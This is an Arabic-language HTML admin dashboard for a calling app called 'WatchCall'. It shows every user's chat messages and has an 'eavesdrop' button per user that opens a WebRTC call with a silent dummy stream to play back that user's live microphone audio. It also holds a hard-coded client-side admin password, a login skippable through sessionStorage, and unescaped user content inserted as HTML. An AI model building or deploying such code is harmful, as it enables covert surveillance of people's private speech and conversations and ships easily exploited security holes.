<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WatchCall - Admin Control Center</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Cabinet+Grotesk:wght@700;800;900&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <script src="https://unpkg.com/lucide@latest"></script>

    <style>
        :root {
            --bg-dark: #05070f;
            --card-bg: rgba(13, 18, 33, 0.9);
            --card-border: rgba(255, 255, 255, 0.08);
            --accent-blue: #0066ff;
            --danger-red: #ef4444;
            --success-green: #10b981;
            --warning-yellow: #f59e0b;
            --text-main: #f3f4f6;
            --text-muted: #6b7280;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', system-ui, sans-serif; }
        body { background-color: var(--bg-dark); color: var(--text-main); min-height: 100vh; display: flex; flex-direction: column; overflow: hidden; }

        /* Login Overlay */
        #login-modal {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(5, 7, 15, 0.98); backdrop-filter: blur(25px);
            z-index: 9999; display: flex; justify-content: center; align-items: center;
        }
        .login-card {
            background: var(--card-bg); border: 1px solid var(--card-border);
            padding: 35px; border-radius: 24px; width: 100%; max-width: 380px; text-align: center;
            box-shadow: 0 20px 50px rgba(0,0,0,0.8);
        }
        .login-card h2 { font-family: 'Cabinet Grotesk', sans-serif; font-size: 22px; margin-bottom: 20px; }
        .login-card input {
            width: 100%; padding: 12px 16px; background: rgba(255,255,255,0.03);
            border: 1px solid var(--card-border); border-radius: 12px; color: white;
            font-size: 14px; margin-bottom: 15px; outline: none; text-align: center;
        }
        .login-card input:focus { border-color: var(--accent-blue); }
        .login-card button {
            width: 100%; padding: 12px; background: var(--accent-blue); border: none;
            border-radius: 12px; color: white; font-weight: 700; cursor: pointer; transition: 0.2s;
        }
        .login-card button:hover { background: #0052cc; }

        /* Header Bar */
        header {
            background: rgba(9, 14, 28, 0.9); border-bottom: 1px solid var(--card-border);
            padding: 15px 30px; display: flex; justify-content: space-between; align-items: center;
        }
        .brand { display: flex; align-items: center; gap: 12px; font-family: 'Cabinet Grotesk', sans-serif; font-size: 20px; font-weight: 800; }
        .brand span { color: var(--accent-blue); }

        .stats-strip { display: flex; gap: 15px; }
        .stat-badge {
            background: rgba(255, 255, 255, 0.03); border: 1px solid var(--card-border);
            padding: 6px 14px; border-radius: 10px; font-size: 13px; font-weight: 700;
            display: flex; align-items: center; gap: 8px;
        }
        .stat-badge span.value { color: var(--accent-blue); font-weight: 900; }

        /* Dashboard Layout */
        .dashboard-grid {
            display: grid; grid-template-columns: 320px 1fr 320px; gap: 20px;
            padding: 20px; flex: 1; height: calc(100vh - 70px);
        }

        .panel {
            background: var(--card-bg); border: 1px solid var(--card-border);
            border-radius: 20px; padding: 20px; display: flex; flex-direction: column; gap: 15px; overflow: hidden;
        }
        .panel-title {
            font-size: 14px; font-weight: 800; display: flex; align-items: center; gap: 10px;
            color: var(--text-main); border-bottom: 1px solid var(--card-border); padding-bottom: 12px;
        }

        .scrollable-list { overflow-y: auto; display: flex; flex-direction: column; gap: 10px; flex: 1; }
        
        .user-card {
            background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.05);
            padding: 12px; border-radius: 12px; display: flex; align-items: center; justify-content: space-between;
        }
        .user-info { display: flex; align-items: center; gap: 10px; }
        .user-info img { width: 34px; height: 34px; border-radius: 50%; border: 1px solid var(--accent-blue); }
        .user-name { font-size: 13px; font-weight: 700; }
        .user-code { font-size: 11px; color: var(--text-muted); direction: ltr; }

        .btn-action {
            background: rgba(255, 255, 255, 0.05); border: 1px solid var(--card-border);
            color: white; padding: 6px 12px; border-radius: 8px; cursor: pointer;
            font-size: 12px; font-weight: 700; display: flex; align-items: center; gap: 6px; transition: 0.2s;
        }
        .btn-action:hover { background: var(--accent-blue); }
        .btn-action.listening { background: var(--danger-red); animation: pulse 1.5s infinite; }

        .chat-feed { flex: 1; background: rgba(0,0,0,0.2); border-radius: 12px; padding: 12px; overflow-y: auto; display: flex; flex-direction: column; gap: 8px; }
        .chat-line { font-size: 12px; line-height: 1.4; word-break: break-word; }
        .chat-line strong { color: var(--accent-blue); }

        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
    </style>
</head>
<body>

    <!-- AUTH MODAL -->
    <div id="login-modal">
        <div class="login-card">
            <h2>WatchCall Admin Auth</h2>
            <input type="text" id="admin-user" placeholder="اسم المستخدم" autocomplete="off">
            <input type="password" id="admin-pass" placeholder="كلمة المرور">
            <button id="btn-login">تسجيل الدخول</button>
        </div>
    </div>

    <!-- MAIN CONTROL HUB -->
    <header>
        <div class="brand">
            <i data-lucide="shield-check" style="color: var(--accent-blue);"></i>
            WatchCall <span>Control Center</span>
        </div>
        <div class="stats-strip">
            <div class="stat-badge">
                <i data-lucide="users" style="color: var(--success-green);"></i>
                المتواجدون: <span class="value" id="stat-online">0</span>
            </div>
            <div class="stat-badge">
                <i data-lucide="radio" style="color: var(--warning-yellow);"></i>
                المكالمات: <span class="value" id="stat-calls">0</span>
            </div>
        </div>
    </header>

    <div class="dashboard-grid">
        
        <!-- USERS LIST -->
        <div class="panel">
            <div class="panel-title">
                <i data-lucide="users"></i> المستخدمون المتاحون
            </div>
            <div class="scrollable-list" id="users-list">
                <div style="color: var(--text-muted); font-size: 12px; text-align: center;">جاري التحميل...</div>
            </div>
        </div>

        <!-- MAIN MONITOR & LIVE CHAT -->
        <div class="panel">
            <div class="panel-title">
                <i data-lucide="message-square"></i> مراقبة المحادثات العامة
            </div>
            <div class="chat-feed" id="global-chat-feed">
                <div style="color: var(--text-muted); font-size: 12px; text-align: center;">في انتظار الرسائل الحية...</div>
            </div>
        </div>

        <!-- ACTIONS & AUDIO CONTROL -->
        <div class="panel">
            <div class="panel-title">
                <i data-lucide="sliders"></i> التحكم والعمليات
            </div>
            <div style="display: flex; flex-direction: column; gap: 12px;">
                <button class="btn-action" style="padding: 12px; justify-content: center;" id="btn-broadcast">
                    <i data-lucide="megaphone"></i> إرسال تنبيه عام
                </button>
                <button class="btn-action" style="padding: 12px; justify-content: center; background: rgba(239, 68, 68, 0.1); border-color: rgba(239, 68, 68, 0.3); color: var(--danger-red);" id="btn-clear-all">
                    <i data-lucide="trash-2"></i> إنهاء كافة المكالمات
                </button>
            </div>

            <div class="panel-title" style="margin-top: 15px;">
                <i data-lucide="volume-2"></i> حالة الاستماع
            </div>
            <div id="listening-status" style="font-size: 12px; color: var(--text-muted); text-align: center;">لا توجد أي جلسة تنصت نشطة حالياً</div>
        </div>

    </div>

    <audio id="admin-listen-audio" autoplay style="display:none;"></audio>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
        import { getDatabase, ref, onValue, remove, set, push } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-database.js";

        const firebaseConfig = { databaseURL: "https://my-house-672f0-default-rtdb.firebaseio.com/" };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        let peer = null;
        let activeCall = null;

        lucide.createIcons();

        // 1. Auth Check
        document.getElementById('btn-login').addEventListener('click', () => {
            const u = document.getElementById('admin-user').value;
            const p = document.getElementById('admin-pass').value;

            if (u === "admin" && p === "reda2019") {
                document.getElementById('login-modal').style.display = 'none';
                sessionStorage.setItem('admin_auth', 'true');
                initAdmin();
            } else {
                alert("بيانات الدخول غير صحيحة!");
            }
        });

        if (sessionStorage.getItem('admin_auth') === 'true') {
            document.getElementById('login-modal').style.display = 'none';
            initAdmin();
        }

        function initAdmin() {
            peer = new Peer({
                config: { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] }
            });

            // 2. Track Online Count
            onValue(ref(db, 'online_presence'), (snapshot) => {
                const count = snapshot.exists() ? Object.keys(snapshot.val()).length : 0;
                document.getElementById('stat-online').innerText = count;
            });

            // 3. Track Active Calls
            onValue(ref(db, 'calls'), (snapshot) => {
                const count = snapshot.exists() ? Object.keys(snapshot.val()).length : 0;
                document.getElementById('stat-calls').innerText = count;
            });

            // 4. Render Users List
            onValue(ref(db, 'users'), (snapshot) => {
                const usersList = document.getElementById('users-list');
                usersList.innerHTML = '';

                if (!snapshot.exists()) {
                    usersList.innerHTML = '<div style="color: var(--text-muted); font-size: 12px; text-align: center;">لا يوجد مستخدمون حالياً</div>';
                    return;
                }

                snapshot.forEach((child) => {
                    const user = child.val();
                    const userId = child.key;

                    const card = document.createElement('div');
                    card.className = 'user-card';
                    card.innerHTML = `
                        <div class="user-info">
                            <img src="${user.avatar || 'https://api.dicebear.com/7.x/bottts/svg?seed=default'}" alt="">
                            <div>
                                <div class="user-name">${user.name || 'مستخدم'}</div>
                                <div class="user-code">Code: ${user.code || '---'}</div>
                            </div>
                        </div>
                        <button class="btn-action" data-peer="${userId}" id="btn-listen-${userId}">
                            <i data-lucide="mic"></i> تنصت
                        </button>
                    `;
                    usersList.appendChild(card);

                    document.getElementById(`btn-listen-${userId}`).onclick = () => startListening(userId, user.name);
                });
                lucide.createIcons();
            });

            // 5. Global Chat Stream
            onValue(ref(db, 'chats'), (snapshot) => {
                const chatFeed = document.getElementById('global-chat-feed');
                chatFeed.innerHTML = '';

                if (!snapshot.exists()) return;

                snapshot.forEach((room) => {
                    room.forEach((msgSnap) => {
                        const msg = msgSnap.val();
                        const line = document.createElement('div');
                        line.className = 'chat-line';
                        line.innerHTML = `<strong>${msg.sender}:</strong> ${msg.text}`;
                        chatFeed.appendChild(line);
                    });
                });
                chatFeed.scrollTop = chatFeed.scrollHeight;
            });

            // 6. Audio Listening via Dummy MediaStream
            window.startListening = function(targetPeerId, userName) {
                if (activeCall) activeCall.close();

                // Create silent audio track for WebRTC offer
                const ctx = new (window.AudioContext || window.webkitAudioContext)();
                const osc = ctx.createOscillator();
                const dst = osc.connect(ctx.createMediaStreamDestination());
                osc.start();
                const dummyStream = dst.stream;

                activeCall = peer.call(targetPeerId, dummyStream);

                document.getElementById('listening-status').innerText = `جاري التنصت على: ${userName}...`;
                
                activeCall.on('stream', (remoteStream) => {
                    const audioElem = document.getElementById('admin-listen-audio');
                    audioElem.srcObject = remoteStream;
                    audioElem.play();
                    document.getElementById('listening-status').innerText = `متصل الآن بالميكروفون الخاص بـ: ${userName}`;
                });

                activeCall.on('close', () => {
                    document.getElementById('listening-status').innerText = 'تم قطع التنصت';
                });
            };

            // 7. Actions
            document.getElementById('btn-clear-all').addEventListener('click', () => {
                if (confirm("هل أنت تأكد من إغلاق كافة الغرف والمكالمات الحالية؟")) {
                    remove(ref(db, 'calls'));
                    remove(ref(db, 'chats'));
                    alert("تم إنهاء الجلسات بفرز كامل.");
                }
            });

            document.getElementById('btn-broadcast').addEventListener('click', () => {
                const msg = prompt("أدخل الرسالة العامة لجميع الغرف:");
                if (msg) {
                    push(ref(db, 'system_broadcasts'), { text: msg, timestamp: Date.now() });
                    alert("تم إرسال التنبيه التلقائي بنجاح.");
                }
            });
        }
    </script>
</body>
</html>
